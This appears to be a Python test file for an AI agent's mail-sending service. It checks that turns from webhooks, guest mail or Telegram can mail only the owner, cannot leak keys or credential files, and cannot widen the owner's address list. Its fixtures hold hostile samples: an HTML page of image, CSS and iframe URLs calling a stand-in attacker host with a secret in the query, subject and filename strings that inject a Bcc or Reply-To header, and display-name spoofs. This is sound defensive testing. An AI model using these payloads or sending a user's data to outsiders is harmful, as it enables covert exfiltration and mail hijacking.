"""#0304 (chairman 11-09 19:27): the owner's own automation (webhook turn) mailing slot 0 was refused `group_source`.

Rule (contacts_serve.agent_send): when EVERY final recipient — To + Cc + Bcc, after name resolution and dedupe — is an owner
address (slot 0 e-mails + 「我本人」 allowlist rows; exact address after strip + lower-case, never a domain, alias or +tag), any
turn source may send, without a card (the P296 owner-direct path). One third-party recipient (an allowlisted guest too) keeps
`group_source` exactly as before, nothing sent, the address book not read for a literal outside address. Such an outside turn
gets the strict attachment scan and no secret pickup cards. Turn content cannot rewrite slot 0 / the owner rows.
Local fake SMTP only (tests/mailfake.py); synthetic @example.com addresses.
"""
import _hermetic  # noqa: F401,I001
from _testtmp import TEST_TMP  # noqa: E402
import base64
import email
import email.policy
import json
import pathlib
import sys
import tempfile
import unittest
from types import SimpleNamespace as NS
from unittest.mock import AsyncMock

HERE = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
sys.path.insert(0, str(HERE))
from agentj import contacts as C, diskq, mail as M, privacy, provenance as P  # noqa: E402
from agentj.contacts_serve import ContactService  # noqa: E402
from agentj.state import State  # noqa: E402
from mailfake import FakeSMTP  # noqa: E402

AGENT = "agent.p0304@example.com"
CODE = "right-code"
OWNER = "owner.p0304@example.com"          # slot 0
OWNER_ROW = "owner.alt.p0304@example.com"  # a 「我本人」 allowlist row
GUEST = "guest.p0304@example.com"          # allowlisted, role guest
BOB = "bob.p0304@example.com"              # an ordinary contact
EVIL = "evil.p0304@example.com"
KEY = privacy.FAKE_SECRETS["openrouter"]

OUTSIDE = {
    "webhook": NS(kind="claude", cur_send=NS(source=P.system(), hook_notice=True)),
    "automation": NS(kind="claude", cur_send=NS(source=P.automation("x-hotpicks"))),
    "guest_mail": NS(kind="claude", cur_send=NS(source=P.email_guest(GUEST))),
    "unverified_owner_mail": NS(kind="claude", cur_send=NS(source=P.email_guest(OWNER))),
    "telegram_group": NS(kind="claude", cur_send=NS(source=P.telegram_group(-100, 7001, "proxy", 7001))),
    "telegram_forward": NS(kind="claude", cur_send=NS(source=P.telegram_forward(7001))),
    "unknown": NS(kind="codex", native_source=None),
}


def envelope(smtp) -> list[str]:
    return [a for _f, to, _raw in smtp.sent for a in to]


def events(st, ev):
    diskq.flush()
    try:
        lines = st.log_path.read_text().splitlines()
    except FileNotFoundError:
        return []
    return [r for r in map(json.loads, lines) if r.get("ev") == ev]


class _Fx(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        self.smtp = FakeSMTP(AGENT, CODE)
        self.addCleanup(self.smtp.close)
        self.tmp = tempfile.TemporaryDirectory(prefix="p0304m-", dir=TEST_TMP)
        self.addCleanup(self.tmp.cleanup)
        root = pathlib.Path(self.tmp.name)
        self.st = State(root / "state"); self.st.init()
        self.work = root / "work"; self.work.mkdir()
        self.acts = []
        self.ask = AsyncMock(return_value={"behavior": "allow"})
        self.out = NS(send=AsyncMock(return_value={"result": "sent"}))
        self.host = NS(st=self.st, lang="zh", agent=NS(kind="claude", native_source=P.terminal()),
                       agent_cfg={"dir": str(self.work)}, media=None, hist=NS(get=lambda i: None), stopped=lambda: False,
                       ask=self.ask, _approvers=lambda: ["dev1"], elevate=NS(out=self.out),
                       activity=lambda kind, **kw: self.acts.append((kind, kw)))
        self.svc = ContactService(NS(host=self.host, st=self.st))
        cfg = M.blank_config()
        cfg.update(address=AGENT, username=AGENT,
                   allow=[{"addr": OWNER_ROW, "role": "owner"}, {"addr": GUEST, "role": "guest"}],
                   imap={"host": "127.0.0.1", "port": 1, "security": "plain"},
                   smtp={"host": "127.0.0.1", "port": self.smtp.port, "security": "plain"})
        M.save_config(self.st, M.validate(cfg))
        M.store_secret(self.st, bytearray(CODE.encode()), AGENT)
        res = C.local(self.st, {"op": "owner_set", "owner_ok": True, "contact": {"name": "Owner Name", "emails": [OWNER]}})
        self.assertTrue(res["ok"], res)
        await self.svc.agent({"op": "add", "contact": {"name": "Bob Builder", "emails": [BOB]}})
        self.assertEqual(C.owner_emails(self.st), [OWNER, OWNER_ROW])

    def turn(self, name):
        self.host.agent = OUTSIDE[name]

    async def send(self, **req):
        req.setdefault("subject", "hot picks")
        req.setdefault("body", "today's list")
        return await self.svc.agent_send(req)

    async def refused(self, **req):
        n = len(self.smtp.sent)
        res = await self.send(**req)
        self.assertFalse(res["ok"], res)
        self.assertEqual(res["why"], "group_source", res)
        self.assertTrue(res["detail"])
        self.ask.assert_not_awaited()
        self.assertEqual(len(self.smtp.sent), n, "nothing sent")
        return res


class OwnerOnlyFromAnySource(_Fx):
    async def test_webhook_turn_mails_slot0_without_a_card(self):
        self.turn("webhook")
        res = await self.send(to=[OWNER])
        self.assertTrue(res["ok"], res)
        self.assertEqual((res["sent"], res["owner_direct"], res["no_card"]), ([OWNER], True, True))
        self.ask.assert_not_awaited()
        self.assertEqual(envelope(self.smtp), [OWNER])
        self.assertTrue([kw for k, kw in self.acts if k == "auto" and kw.get("by") == "owner_self"], "activity row kept")
        self.assertEqual(events(self.st, "mail_send")[-1].get("via"), "system")

    async def test_every_outside_source_may_mail_the_owner(self):
        for name in OUTSIDE:
            with self.subTest(source=name):
                self.turn(name)
                n = len(self.smtp.sent)
                res = await self.send(to_owner=True)
                self.assertTrue(res["ok"], (name, res))
                self.assertEqual(res["sent"], [OWNER, OWNER_ROW])
                self.assertEqual(len(self.smtp.sent), n + 1)
                self.ask.assert_not_awaited()

    async def test_cc_bcc_all_owner_addresses(self):
        self.turn("webhook")
        res = await self.send(to=[OWNER], cc=[OWNER_ROW], bcc=[OWNER.upper()])
        self.assertTrue(res["ok"], res)
        self.assertEqual(sorted(envelope(self.smtp)), sorted([OWNER, OWNER_ROW]), "deduped")

    async def test_case_and_wrapping_are_the_same_address(self):
        self.turn("webhook")
        for who in (OWNER.upper(), f" <{OWNER}> ", f"mailto:{OWNER}"):
            with self.subTest(who=who):
                res = await self.send(to=[who])
                self.assertTrue(res["ok"], res)
                self.assertEqual(res["sent"], [OWNER])

    async def test_a_name_resolving_to_slot0_is_the_owner(self):
        self.turn("webhook")
        res = await self.send(to=["Owner Name"])
        self.assertTrue(res["ok"], res)
        self.assertEqual(res["sent"], [OWNER])


class ThirdPartyStillRefused(_Fx):
    async def test_webhook_to_a_third_party(self):
        self.turn("webhook")
        reads = []
        orig = self.svc.resolve
        self.svc.resolve = lambda who: (reads.append(who), orig(who))[1]
        res = await self.refused(to=[BOB])
        self.assertEqual(res["source"], "system")
        self.assertEqual(reads, [], "a literal outside address is refused before any address-book read")

    async def test_mixed_recipients_refused_and_nothing_sent(self):
        self.turn("webhook")
        for req in ({"to": [OWNER, BOB]}, {"to": [OWNER], "cc": [BOB]}, {"to": [OWNER], "bcc": [EVIL]},
                    {"to": [BOB], "bcc": [OWNER]}, {"to_owner": True, "bcc": [EVIL]}, {"to_owner": True, "cc": [EVIL]},
                    {"to": [OWNER], "cc": ["Bob Builder"]}):
            with self.subTest(req=req):
                await self.refused(**req)
        res = await self.send(bcc=[OWNER, EVIL])          # no To at all: the shape check, still nothing sent
        self.assertFalse(res["ok"], res)
        self.assertEqual(self.smtp.sent, [])

    async def test_alias_and_plus_tag_are_not_the_owner(self):
        self.turn("webhook")
        local, _, dom = OWNER.partition("@")
        for who in (f"{local}+x@{dom}", f"{local}@mail.{dom}", f"{local}.@{dom}", f"@{dom}", dom):
            with self.subTest(who=who):
                await self.refused(to=[who])

    async def test_display_name_spoof_judged_by_final_address(self):
        self.turn("webhook")
        for who in (f'"Owner Name" <{EVIL}>', f"Owner Name <{EVIL}>", f"{OWNER} <{EVIL}>", f"{EVIL} ({OWNER})"):
            with self.subTest(who=who):
                n = len(self.smtp.sent)
                res = await self.send(to=[who])
                self.assertNotIn(EVIL, envelope(self.smtp))
                if res["ok"]:                      # fuzzy name match on slot 0: then it went to the owner only
                    self.assertEqual(res["sent"], [OWNER])
                else:
                    self.assertEqual(res["why"], "group_source", res)
                    self.assertEqual(len(self.smtp.sent), n)
        self.ask.assert_not_awaited()

    async def test_a_name_resolving_to_someone_else(self):
        self.turn("webhook")
        await self.refused(to=["Bob Builder"])
        await self.refused(to=["nobody-known-here"])     # unresolved: the outsider rule, not a book-probing not_found

    async def test_allowlisted_guest_is_still_a_third_party(self):
        self.turn("webhook")
        await self.refused(to=[GUEST])
        self.turn("guest_mail")
        await self.refused(to=[GUEST])

    async def test_scheduled_task_keeps_its_card(self):
        self.host.agent = NS(kind="codex", native_source=None)
        with P.task_run():
            res = await self.send(to=[OWNER])
        self.assertTrue(res["ok"], res)
        self.ask.assert_awaited_once()
        self.assertFalse(res["no_card"])


class OutsideFilters(_Fx):
    async def test_body_keys_are_held_no_pickup_cards(self):
        self.turn("webhook")
        res = await self.send(to=[OWNER], body=f"report key: {KEY}")
        self.assertTrue(res["ok"], res)
        raw = self.smtp.sent[-1][2]
        self.assertNotIn(KEY.encode(), raw)
        self.out.send.assert_not_awaited()
        self.assertNotIn("secret_cards", res)

    async def test_credential_files_refused_plain_files_go(self):
        self.turn("webhook")
        env = self.work / ".env"
        env.write_text("K=v")
        leak = self.work / "notes.txt"
        leak.write_text(f"token {KEY}\n")
        for f in (env, leak):
            with self.subTest(f=f.name):
                res = await self.send(to=[OWNER], files=[str(f)])
                self.assertEqual((res["ok"], res["why"]), (False, "file"), res)
        self.assertEqual(self.smtp.sent, [])
        ok = self.work / "picks.txt"
        ok.write_text("1. a\n2. b\n")
        res = await self.send(to=[OWNER], files=[str(ok)])
        self.assertTrue(res["ok"], res)
        self.assertEqual(res["files"], ["picks.txt"])
        self.out.send.assert_not_awaited()

    async def test_subject_line_breaks_cannot_add_headers_or_recipients(self):
        self.turn("webhook")
        for sep in ("\r\n", "\n", " ", "\x85"):
            with self.subTest(sep=repr(sep)):
                res = await self.send(to=[OWNER], subject=f"picks{sep}Bcc: {EVIL}{sep}Reply-To: {EVIL}")
                self.assertTrue(res["ok"], res)
                msg = email.message_from_bytes(self.smtp.sent[-1][2], policy=email.policy.default)
                self.assertIsNone(msg["Bcc"]); self.assertIsNone(msg["Reply-To"])
                self.assertEqual(self.smtp.sent[-1][1], [OWNER])
        self.assertNotIn(EVIL, envelope(self.smtp))


TRAP = "attacker.p0304.example"
REMOTE_HTML = (
    f'<html><head><link rel="stylesheet" href="https://{TRAP}/l.css"><style>@import url("https://{TRAP}/i.css");'
    f'body{{background:url(https://{TRAP}/bg.png)}} .x{{background-image:url(\'//{TRAP}/x\')}}</style>'
    f'<meta http-equiv="refresh" content="0;url=https://{TRAP}/m"></head>'
    f'<body background="https://{TRAP}/b.png"><h1>Hot picks</h1>'
    f'<img src="https://{TRAP}/?d=SECRET-DIGEST" alt="pic">'
    f'<img srcset="https://{TRAP}/s1.png 1x, https://{TRAP}/s2.png 2x">'
    f'<picture><source srcset="https://{TRAP}/p.webp"></picture>'
    f'<video poster="https://{TRAP}/v.png" src="https://{TRAP}/v.mp4"></video>'
    f'<table background="https://{TRAP}/t.png"><tr><td style="background:url(https://{TRAP}/td.png)">cell</td></tr></table>'
    f'<svg><image href="https://{TRAP}/svg.png"/></svg><object data="https://{TRAP}/o"></object>'
    f'<embed src="https://{TRAP}/e"><iframe src="https://{TRAP}/f"></iframe>'
    f'<p style="list-style:url(https://{TRAP}/li.png)">1. alpha</p>'
    f'<p><a href="https://{TRAP}/click">read more</a></p></body></html>')


def parts(raw: bytes) -> list[tuple[str, str]]:
    """(content type, decoded text) of every text part — what the owner's mail client gets after transfer decoding."""
    msg = email.message_from_bytes(raw, policy=email.policy.default)
    return [(p.get_content_type(), p.get_content()) for p in msg.walk() if p.get_content_maintype() == "text"]


class OutsideHtmlNoRemoteFetch(_Fx):
    """#0304 sec A1: an outside turn's `--format html` mail to the owner can carry no reference the owner's client would
    fetch on open (img / srcset / background / poster / CSS url() / <link> / @import / object / embed / iframe / meta
    refresh) — the page is flattened to its words and sent in the markdown look. Owner turns keep the HTML as written."""

    async def test_outside_html_has_no_fetchable_url(self):
        for name in ("webhook", "guest_mail", "telegram_group", "telegram_forward", "unknown"):
            with self.subTest(source=name):
                self.turn(name)
                res = await self.send(to=[OWNER], format="html", body=REMOTE_HTML)
                self.assertTrue(res["ok"], res)
                raw = self.smtp.sent[-1][2]
                self.assertNotIn(TRAP.encode(), raw)
                got = parts(raw)
                self.assertTrue(any(t == "text/html" for t, _ in got), "still a formatted mail")
                for t, text in got:
                    self.assertNotIn(TRAP, text, t)
                    self.assertNotIn("SECRET-DIGEST", text, t)
                    if t == "text/html":
                        low = text.lower()
                        for needle in ("<img", "srcset", "<link", "@import", "<iframe", "<object", "<embed", "http-equiv",
                                       "poster=", "background=", f"url(https://{TRAP}", "<video"):
                            self.assertNotIn(needle, low, (t, needle))
                self.assertIn("Hot picks", got[0][1], "the words still arrive")
                self.assertEqual(res["format"], "markdown", "the result says what was sent")
                self.ask.assert_not_awaited()

    async def test_outside_markdown_body_cannot_add_an_image(self):
        self.turn("webhook")
        res = await self.send(to=[OWNER], body=f"![x](https://{TRAP}/md.png) <img src=\"https://{TRAP}/raw.png\">")
        self.assertTrue(res["ok"], res)
        html = [text for t, text in parts(self.smtp.sent[-1][2]) if t == "text/html"][0]
        self.assertNotIn("<img", html.lower(), "markdown never makes an image; raw tags are escaped")

    async def test_owner_turn_html_is_unchanged(self):
        res = await self.send(to=[OWNER], format="html", body=REMOTE_HTML)
        self.assertTrue(res["ok"], res)
        self.assertEqual(res["format"], "html")
        html = [text for t, text in parts(self.smtp.sent[-1][2]) if t == "text/html"][0]
        self.assertIn(f'<img src="https://{TRAP}/?d=SECRET-DIGEST"', html, "the owner's own page goes as written")
        self.assertIn(f"https://{TRAP}/click", html)


class AttachmentNames(_Fx):
    def test_control_characters_never_reach_the_mime_filename(self):
        cfg = M.read_config(self.st)
        bad = "picks\r\nBcc: evil.p0304@example.com\x00\x1b[31m\x85\u2028\u202e.txt"
        msg = self.svc.build(cfg, [OWNER], "s", "b", files=[(bad, "text/plain", b"x"), ("\r\n\t", "text/plain", b"y")])
        raw = msg.as_bytes()
        back = email.message_from_bytes(raw, policy=email.policy.default)
        names = [p.get_filename() for p in back.iter_attachments()]
        self.assertEqual(names[0], "picksBcc: evil.p0304@example.com[31m.txt")
        self.assertTrue(names[1], "an all-control name still gets a name")
        for n in names:
            self.assertFalse(any(ord(c) < 32 or 0x7f <= ord(c) <= 0x9f or c in "\u2028\u2029\u202e" for c in n), repr(n))
        self.assertIsNone(back["Bcc"])


class OwnerTurnUnchanged(_Fx):
    async def test_owner_turn_owner_only_no_card(self):
        res = await self.send(to=[OWNER], body=f"key {KEY}")
        self.assertTrue(res["ok"] and res["no_card"], res)
        self.ask.assert_not_awaited()
        self.out.send.assert_awaited()          # P573: the owner's own turn still gets the pickup card
        self.assertNotIn("via", events(self.st, "mail_send")[-1])

    async def test_owner_turn_third_party_asks_the_card(self):
        res = await self.send(to=[BOB])
        self.assertTrue(res["ok"], res)
        self.ask.assert_awaited_once()
        self.assertFalse(res["owner_direct"])

    async def test_owner_turn_unknown_name_is_not_found(self):
        res = await self.send(to=["nobody-known-here"])
        self.assertEqual(res["why"], "not_found", res)


class OwnerAddressesStayOwnerConfigured(_Fx):
    """Slot 0 and the owner allowlist rows come only from the owner: an outside turn cannot widen them."""

    async def test_contacts_ops_from_an_outside_turn(self):
        self.turn("webhook")
        for req in ({"op": "owner_set", "owner_ok": True, "contact": {"emails": [EVIL]}},
                    {"op": "edit", "id": C.OWNER_ID, "owner_ok": True, "changes": {"add_email": [EVIL]}},
                    {"op": "edit", "id": C.OWNER_ID, "changes": {"emails": [EVIL]}},
                    {"op": "rm", "id": C.OWNER_ID, "owner_ok": True},
                    {"op": "add", "contact": {"name": "Owner Name", "emails": [OWNER, EVIL]}},
                    {"op": "import", "format": "vcf", "data": base64.b64encode(
                        f"BEGIN:VCARD\nVERSION:3.0\nFN:Owner Name\nEMAIL:{OWNER}\nEMAIL:{EVIL}\nEND:VCARD\n".encode()).decode()}):
            with self.subTest(op=req["op"]):
                await self.svc.agent(req)
                self.assertEqual(C.owner_emails(self.st), [OWNER, OWNER_ROW])
        card = await self.svc.card({"owner": True, "contact": {"emails": [EVIL]}})
        self.assertEqual(card.get("result"), "group_source", card)
        await self.refused(to=[EVIL])
        await self.refused(to=["Owner Name"], cc=[EVIL])

    async def test_mail_allow_owner_row_from_an_outside_turn_is_not_applied(self):
        from test_l1 import _host, _state
        with tempfile.TemporaryDirectory(prefix="p0304a-", dir=TEST_TMP) as d:
            st = _state(d)
            host = _host(st, [])
            host.agent = NS(kind="claude", cur_send=NS(source=P.system(), hook_notice=True))
            host.mail = M.Mail(host)
            base = M.blank_config(); base.update(address=AGENT, allow=[{"addr": OWNER_ROW, "role": "owner"}])
            host.mail.set_config(base)
            out = []

            class W:
                def write(self, b): out.append(json.loads(b))
                async def drain(self): pass
            for row in ({"addr": EVIL, "role": "owner"}, {"addr": "@example.com", "role": "guest"}):
                wider = {**base, "allow": base["allow"] + [row]}
                await host._ctl_mail(W(), {"cfg": wider}, claimed=False)
                self.assertFalse(out[-1]["ok"], out[-1])
                self.assertEqual(M.read_config(st)["allow"], base["allow"])
            self.assertNotIn(EVIL, C.owner_emails(st))


if __name__ == "__main__":
    unittest.main()
